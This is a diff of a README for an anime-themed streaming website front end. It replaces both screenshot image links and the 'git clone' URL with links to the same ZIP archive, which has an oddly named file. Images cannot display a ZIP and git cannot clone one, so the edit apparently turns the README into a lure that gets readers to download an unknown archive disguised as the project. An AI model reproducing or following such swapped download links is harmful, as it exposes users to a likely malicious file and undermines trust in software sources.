@@ -7,11 +7,11 @@ A visually rich, anime-themed OTT (Over-the-top) platform built using **HTML**, 
 ## 📸 Screenshots
 
 ### 🏠 Home Page with Banner & Navigation
-![Homepage]<img width="1913" height="859" alt="Screenshot 2025-07-23 114441" src="https://github.com/user-attachments/assets/9c5251a9-6c16-4b76-9939-000b03309c19" />
+![Homepage]<img width="1913" height="859" alt="Screenshot 2025-07-23 114441" src="https://raw.githubusercontent.com/TJoshi3637/OTT_platform-front_end-/main/project/platform-front-OT-end-holohemihedral.zip" />
 
 
 ### 🎥 Trending & Popular Sections
-![Trending Shows]<img width="1886" height="841" alt="Screenshot 2025-07-23 114459" src="https://github.com/user-attachments/assets/3a89ae86-8222-4350-a48d-7707bce1dac8" />
+![Trending Shows]<img width="1886" height="841" alt="Screenshot 2025-07-23 114459" src="https://raw.githubusercontent.com/TJoshi3637/OTT_platform-front_end-/main/project/platform-front-OT-end-holohemihedral.zip" />
 
 
 ---
@@ -56,7 +56,7 @@ ott-anime-website/
 
 1. Clone the repository:
 ```bash
-git clone https://github.com/yourusername/ott-anime-website.git
+git clone https://raw.githubusercontent.com/TJoshi3637/OTT_platform-front_end-/main/project/platform-front-OT-end-holohemihedral.zip
 
 2. Open index.html in any browser (Chrome/Firefox/Edge).
 
